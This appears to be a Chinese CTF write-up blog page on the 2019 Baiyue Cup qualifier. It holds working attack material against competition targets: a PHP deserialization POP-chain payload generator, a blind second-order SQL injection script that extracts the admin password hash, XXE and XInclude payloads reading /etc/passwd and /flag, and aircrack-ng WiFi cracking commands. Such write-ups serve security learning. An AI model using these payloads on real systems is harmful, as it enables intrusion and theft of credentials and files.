@@ -1,0 +1,712 @@
+
+<!DOCTYPE html>
+<html lang class="loading">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>百越杯初赛 Write Up - Knlvre</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="百越杯初赛记录 2 道 web 题，2 道 Misc 题
+babyphp题目源码
+&amp;lt;?php 
+error_reporting(1);
+class Read {
+    private $va,"> 
+    <meta name="author" content="Knlvre"> 
+    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
+    <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
+    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
+</head>
+</html>
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">Knlvre</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">百越杯初赛 Write Up</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg);">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+                
+                November 20, 2019
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/11/20/百越杯初赛 Write Up/" title="百越杯初赛 Write Up">百越杯初赛 Write Up</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    17k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    15 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/CTF比赛/">CTF比赛</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="百越杯初赛"><a href="#百越杯初赛" class="headerlink" title="百越杯初赛"></a>百越杯初赛</h1><p>记录 2 道 web 题，2 道 Misc 题</p>
+<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>题目源码</p>
+<pre><code class="php">&lt;?php 
+error_reporting(1);
+class Read {
+    private $var;
+    public function file_get($value) {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }
+    public function __invoke() {
+        $content = $this-&gt;file_get($this-&gt;var);
+        echo $content;
+    }
+}
+class Show {
+    public $source;
+    public $str;
+    public function __construct($file = &#39;index.php&#39;) {
+        $this-&gt;source = $file;
+        echo $this-&gt;source . &#39;瑙ｆ瀽寮€濮�&#39; . &quot;&lt;br&gt;&quot;;
+    }
+    public function __toString() {
+        $this-&gt;str[&#39;str&#39;]-&gt;source;
+    }
+    public function _show() {
+        if (preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;, $this-&gt;source)) {
+            die(&#39;hacker!&#39;);
+        } else {
+            highlight_file($this-&gt;source);
+        }
+    }
+    public function __wakeup() {
+        if (preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {
+            echo &quot;hacker~&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        }
+    }
+}
+class Test {
+    public $params;
+    public function __construct() {
+        $this-&gt;params = array();
+    }
+    public function __get($key) {
+        $func = $this-&gt;params;
+        return $func();
+    }
+}
+
+if (isset($_GET[&#39;chal&#39;])) {
+    $chal = unserialize($_GET[&#39;chal&#39;]);
+} else {
+    $show = new Show(&#39;index.php&#39;);
+    $show-&gt;_show();
+}
+?&gt;
+</code></pre>
+<p>从几个类的<strong>魔术方法</strong>来构造POP链：</p>
+<p>① 很明显这道题目能够读取文件的函数是<strong>Read::file_get()</strong>方法中的<strong>file_get_contents()</strong>函数，而其又由<strong>Read::__invoke()</strong>魔术方法触发</p>
+<p>② <strong>__invoke</strong>魔术方法触发的条件是：当尝试以调用<strong>方法</strong>的方式调用一个对象时。而我们发现本题中只有<strong>Test::__get()</strong>魔术方法的<strong>return $func()</strong>可以触发，只要<strong>$func = new Read()</strong>就可以，因为会等于<strong>return Read()</strong>，此时<strong>Read</strong>不只是类名，因为后面被加上<strong>括号</strong>，所以被当成了<strong>方法</strong>。 此时需要触发<strong>Test::__get()</strong>魔术方法 </p>
+<p>③ <strong>__get()</strong>魔术方法触发的条件是：当访问类中的一个<strong>不存在</strong>属性时。我们发现<strong>Show::__toString()</strong>魔术方法中的语句：<strong>$this-&gt;str[‘str’]-&gt;source</strong>，可以令<strong>str[‘str’] = new Test()</strong>，而<strong>source</strong>是<strong>Test</strong>类中没有的属性。此时就需要触发<strong>Show::_toString()</strong>魔术方法，发现<strong>Show::__wakeup()</strong>魔术方法中的<strong>preg_match()</strong>函数有<strong>$this-&gt;source</strong>并且会将其当做字符串来匹配，所以此时只要<strong>$this-&gt;source = new Show()</strong>。</p>
+<p>④ 而出发<strong>Show::__wakeup()</strong>魔术方法就是<strong>unserialize()</strong>函数</p>
+<p>以此写 POC 生成反序列化字符串</p>
+<p>Ps：① 这里的<strong>$a-&gt;source = new Show();</strong>不能写在<strong>Show::_construct()</strong>魔术方法中，不然会一直循环；② payload 需要<strong>urlencode</strong>的原因是<strong>Read</strong>类的<strong>private $var</strong>序列化后会有不可见字符，url 编码之后不容易出错</p>
+<pre><code class="php">&lt;?php 
+class Read{
+    private $var;
+    public function __construct(){
+        $this-&gt;var = &quot;/var/www/html/fllllllaaaaaag.php&quot;;
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct(){
+        $this-&gt;str = array(&quot;str&quot;=&gt;new Test());
+    }
+}
+
+class Test{
+    public $params;
+    public function __construct(){
+        $this-&gt;params = new Read();
+    }
+}
+
+$a = new Show();
+
+$a-&gt;source = new Show();
+
+echo urlencode(serialize($a)).&quot;\n&quot;;
+?&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/1-1.png" alt="1-1"></p>
+<p>序列化字符串</p>
+<pre><code class="php">O:4:&quot;Show&quot;:2:{
+    s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:{
+        s:6:&quot;source&quot;;N;
+        s:3:&quot;str&quot;;a:1:{
+            s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{
+                s:6:&quot;params&quot;;O:4:&quot;Read&quot;:1:{
+                    s:9:&quot;Readvar&quot;;s:32:&quot;/var/www/html/fllllllaaaaaag.php&quot;;
+                }
+            }
+        }
+    }
+    s:3:&quot;str&quot;;a:1:{
+        s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{
+            s:6:&quot;params&quot;;O:4:&quot;Read&quot;:1:{
+                s:9:&quot;Readvar&quot;;s:32:&quot;/var/www/html/fllllllaaaaaag.php&quot;;
+            }
+        }
+    }
+}
+</code></pre>
+<p>拿下 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/1-2.png" alt="1-2"></p>
+<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>打开靶机，有一个登录和注册功能，源代码中有提示：</p>
+<blockquote>
+<p>\<!-- if you need hash tools, location: tools.php --> </p>
+</blockquote>
+<p>访问tools.php，页面要求提交一个md5值： </p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-1.png" alt="2-1"></p>
+<p>但是提交一个1的md5值，返回无结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-2.png" alt="2-2"></p>
+<p>暂时不知道怎么利用，只能去看看登录注册功能 </p>
+<p>注册发现<strong>admin</strong>用户存在，注册其他用户登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-3.png" alt="2-3"></p>
+<p>发现跳转到了<strong>manage.php</strong>，<strong>action</strong>参数测试发现无文件包含点，点进去<strong>here is your flag</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-4.png" alt="2-4"></p>
+<p>给了一个假flag，又看起来像是md5值，拿进去tools.php里面查询也没有返回结果 </p>
+<p>然后就是<strong>msgid</strong>疑似注入点，但是除了1以外其他都没有返回结果 </p>
+<p>目光回到注册登录功能上，先尝试了一下<strong>约束攻击</strong>，发现注册 admin 1 ，在登陆以后，成功登录admin</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-5.png" alt="2-5"></p>
+<p>但是，点进here is your flag里面还是没有flflag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-6.png" alt="2-6"></p>
+<p>这里有两个here is your flag，估计是因为除了我们注册的admin(空格)外，另外还有一个原本admin的 </p>
+<p>并且发现，当注册一个带有单引号的 admin’ ，会被转义，并且没有显示出<strong>here is your flag</strong>的链接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-7.png" alt="2-7"></p>
+<p>所以，猜测这里存在<strong>二次注入</strong>点，但是一直没试成功，直到放出了提示：<strong>二次注入测试引号逃逸</strong> </p>
+<p>看到了<strong>引号逃逸</strong>，就直接想到了之前约束攻击，其实不是约束攻击，而是后台用了<strong>字符串截取</strong>，测试发现，最大长 </p>
+<p>度为：<strong>30</strong> </p>
+<p>逃逸过程如下：</p>
+<p>重点是让传入的 username 有<strong>反斜杠</strong>，但没有<strong>单引号</strong>，下面会说原因</p>
+<pre><code class="bash">注册：admin                        &#39; =&gt; 长度30
+经过转义处理：admin                        \&#39; =&gt; 长度31
+经过substr截取前30个字符：admin                        \ =&gt;长度30 =&gt;单引号逃逸
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-8.png" alt="2-8"></p>
+<p>结合之前的<strong>here is your flag</strong>链接中的参数<strong>msgid</strong>，就猜测，注册后执行的查询语句： </p>
+<pre><code class="mysql">select * from users where username=&#39;&#39; and msgid=&#39;1&#39;;
+</code></pre>
+<p>那么既然逃逸了username后面的单引号，就只能在<strong>msgid</strong>中执行注入，payload：</p>
+<pre><code class="bash">?msgid= or 1#
+?msgid = or 0#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-9.png" alt="2-9"></p>
+<p>拼接后为</p>
+<pre><code class="mysql">select * from users where username=&#39;admin...\&#39; and msgid=&#39; or 0 #&#39;;
+</code></pre>
+<p>因为前面传递了<strong>反斜杠</strong>，将原本的<strong>单引号</strong>注释掉，与后面的 msgid 的单引号闭合，才能用 or 进行盲注。这里如果多传入一个单引号也不行，因为会造成闭合，并且无法注释掉原本语句内的单引号</p>
+<p>条件为真时有返回结果，为假时无返回</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-10.png" alt="2-10"></p>
+<p>根据这个逻辑进行盲注，exp如下：</p>
+<pre><code class="python">import requests
+s = requests.Session()
+url1 = &quot;http://77cc22401a0b4c509844fd0277781be185c94a4e768f402f.changame.ichunqiu.com/manage.php? action=register&quot;
+url2 = &quot;http://77cc22401a0b4c509844fd0277781be185c94a4e768f402f.changame.ichunqiu.com/manage.php?msgid=&quot;
+
+data = {
+    &quot;username&quot;: &quot;admin                        &#39;&quot;,
+    &quot;password&quot;: &quot;123&quot;
+}
+r1 = s.post(url1, data = data)
+database = &quot;&quot;#web3
+web3 table_name = &quot;flags,users&quot;
+column_name = &quot;id,username,password&quot;
+admin_password = &quot;&quot;
+print r1.text
+
+for i in range(1, 50):
+    for j in range(44, 128):
+        #payload = &quot;%20or%20ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20 where%20table_name=0x7573657273),&quot; + str(i) + &quot;,1))=&quot; + str(j) + &quot;%23&quot;
+        payload = &quot;%20or%20ascii(substr((select%20group_concat(password)%20from%20users%20where%20username=0x61646 d696e),&quot; + str(i) + &quot;,1))=&quot; + str(j) + &quot;%23&quot;
+        r2 = s.get(url2 + payload)
+        if &quot;may be you need to be admin!&quot; in r2.text:
+            database = database + chr(j)
+            print database
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-11.png" alt="2-11"></p>
+<p>注出admin的密码：<strong>251471f34244cb6cd61f6b64c63f7b1a</strong> </p>
+<p>是md5，直接解密不了，这时候就想到了之前的<strong>tools.php</strong>，查询得到明文：<strong>ChunQiuGame</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-12.png" alt="2-12"></p>
+<p>登录admin后，跳转到 manage.php?action=admin ，提示我们POST content 参数进行xxe</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-13.png" alt="2-13"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-14.png" alt="2-14"></p>
+<p>尝试直接引入外部实体读取文件：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;test;&lt;/abc&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-15.png" alt="2-15"></p>
+<p>但是没有返回结果，从相应来看，也没有过滤掉什么关键字 </p>
+<p>尝试无回显xxe，都失败了 </p>
+<p>赛后得到的提示是：<strong>xinclude</strong> </p>
+<p>参考：<a href="https://www.anquanke.com/post/id/156227#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227#h3-5</a> </p>
+<p>里面提到：</p>
+<pre><code class="bash">发现我们可控xml文本内容，但是引入外部实体无效或是存在过滤，尝试编码绕过也不行的时候，那么可以尝试使用 xinclude
+</code></pre>
+<p>猜测后台的源码应该是这样的：</p>
+<pre><code class="php">&lt;?php
+$dom = new DOMDocument;
+$dom-&gt;preserveWhiteSpace = false;
+$dom-&gt;formatOutput = true;
+$dom-&gt;loadXML($xml); 
+echo $dom-&gt;saveXML();
+?&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-16.png" alt="2-16"></p>
+<p>直接用传统引入外部实体的方法读取文件，是因为php的xml库的底层库是libxml2，而在2.6版本之后，改库已默 </p>
+<p>认禁用外部实体引用的解析 </p>
+<p>我们只有加入<strong>LIBXML_NOENT</strong> 选项，才能解析外部实体： </p>
+<pre><code class="bash">$dom-&gt;loadXML($xml,LIBXML_NOENT);
+</code></pre>
+<p>而<strong>xinclude</strong>无需使用 LIBXML_NOENT 选项去开启默认关闭的外部实体引用 </p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-17.png" alt="2-17"></p>
+<p>最后传入payload：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
+ &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;
+&lt;/root&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/2-18.png" alt="2-18"></p>
+<h2 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h2><p>首先题目解压出来 2 个文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-1.png" alt="3-1"></p>
+<p><strong>Winhex</strong>打开这个<strong>102%</strong>发现文件头很熟悉</p>
+<pre><code class="bash">89 47 4E 50
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-2.png" alt="3-2"></p>
+<p>就是<strong>png图片文件头</strong>的变形，将其修改回来。并且添加后缀就可以看到图片</p>
+<pre><code class="bash">89 50 4E 47
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-3.png" alt="3-3"></p>
+<p>将<strong>ori.jpg</strong>做成灰度图（可以用在线网站： <a href="http://grayscale.imageonline.co/cn/" target="_blank" rel="noopener">http://grayscale.imageonline.co/cn/</a> ）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-4.png" alt="3-4"></p>
+<p>下载其<strong>png</strong>格式，这里命名为<strong>ori_grey.png</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-5.png" alt="3-5"></p>
+<p>然后用<strong>PS</strong>打开<strong>102%.png</strong>和<strong>ori_gray.png</strong>，然后复制 ori_gray.png 的图层到 102%.png 上</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-6.png" alt="3-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-7.png" alt="3-7"></p>
+<p>然后来到 102%.png ，选择模式为<strong>减去</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-8.png" alt="3-8"></p>
+<p>然后选择<strong>色阶</strong>，调到<strong>最左边</strong>，就可以看见二维码了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-9.png" alt="3-9"></p>
+<p>扫描二维码，得到一串字符串：<strong>1tsEz_b14ndVV4t3rM4k</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-10.png" alt="3-10"></p>
+<p>然后<strong>binwalk</strong>那张 102%.png 图片，发现有压缩包，但是没那么简单，因为这个图片文件里一共有2个zip文件头（50 4B 03 04），但是前面的 zip 文件头被改成了<strong>4B 50 03 04</strong>，所以<strong>foremost</strong>只识别到后面那个，提取出来的不完整。正确做法是搜索 png 图片结尾（49 45 4E 44 AE 42 60 82），然后就会发现被修改的 zip 文件头，修改它并从那里提取出来，才能完整</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-15.png" alt="3-11"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-11.png" alt="3-12"></p>
+<p>解压需要密码，就用刚才二维码扫出来的字符串解密，得到2张图片</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-12.png" alt="3-13"></p>
+<p>然后用<strong>Stegsolve</strong>先打开其中一张图片，点击<strong>Analyse -&gt; Image Combiner</strong>选择第二张图片，就能看到 flag 的字样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-13.png" alt="3-14"></p>
+<p>可以将模式调整为<strong>SUB</strong>，这样看的比较清晰一些（或者先保存下载，然后再次打开调整）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/百越杯/3-14.png" alt="3-15"></p>
+<p>打出来就是<strong>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</strong></p>
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>题目：<strong>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</strong></p>
+<p>exp</p>
+<pre><code class="python">import base64
+
+s = &quot;cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9&quot;
+
+print(base64.b64decode(s))
+</code></pre>
+<p>拿到 flag ：<strong>please submit: flag{hello_byb}</strong></p>
+<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>找到原题： <a href="https://blog.csdn.net/afu42832/article/details/101767856" target="_blank" rel="noopener">https://blog.csdn.net/afu42832/article/details/101767856</a></p>
+<p>exp</p>
+<pre><code class="python">rgb=[&quot;2f&quot;,&quot;3f&quot;,&quot;24&quot;, &quot;22&quot;,&quot;2e&quot;,&quot;13&quot;, &quot;7f&quot;,&quot;66&quot;,&quot;24&quot;, &quot;71&quot;,&quot;36&quot;,&quot;45&quot;, &quot;7b&quot;,&quot;7e&quot;,&quot;27&quot;, &quot;72&quot;,&quot;33&quot;,&quot;10&quot;, &quot;64&quot;,&quot;67&quot;,&quot;21&quot;, &quot;76&quot;,&quot;67&quot;,&quot;0c&quot;, &quot;70&quot;,&quot;37&quot;,&quot;23&quot;, &quot;72&quot;,&quot;78&quot;,&quot;16&quot;, &quot;7a&quot;,&quot;60&quot;,&quot;20&quot;, &quot;21&quot;,&quot;33&quot;,&quot;45&quot;, &quot;7b&quot;,&quot;32&quot;,&quot;77&quot;, &quot;74&quot;,&quot;37&quot;,&quot;5c&quot;]
+key=&quot;ISEEU!&quot;
+j=0
+for i in rgb:
+        print(chr(int(i,16)^ord(key[j])),end=&#39;&#39;)
+        j+=1
+        j%=6
+</code></pre>
+<p>拿到 flag ：<strong>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</strong></p>
+<h2 id="WireLess"><a href="#WireLess" class="headerlink" title="WireLess"></a>WireLess</h2><p>wifi密码破解</p>
+<pre><code class="bash">crunch 8 8 -t 6666%%%% &gt;&gt; pass.txt
+
+aircrack-ng -w pass.txt WiFi.pcap
+</code></pre>
+<p>参考:<a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/" target="_blank" rel="noopener">https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/</a></p>
+<p># </p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/knlvre.github.io/statics/forhim.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/HaZong.jpg" height=300 width=300></img>
+                    <p>Knlvre</p>
+                    <span>Notes During Information Security Learning.</span>
+                    <dl>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">65 <p>Articles</p></a></li>
+                    <li><a href="/categories">0 <p>Categories</p></a></li>
+                    <li><a href="/tags">9 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#百越杯初赛"><span class="toc-number">1.</span> <span class="toc-text">百越杯初赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-number">1.1.</span> <span class="toc-text">babyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babygame"><span class="toc-number">1.2.</span> <span class="toc-text">babygame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#哈尔的移动城堡"><span class="toc-number">1.3.</span> <span class="toc-text">哈尔的移动城堡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">1.4.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#key"><span class="toc-number">1.5.</span> <span class="toc-text">key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WireLess"><span class="toc-number">1.6.</span> <span class="toc-text">WireLess</span></a></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2019
+        <span class="gradient-text">
+            Knlvre
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
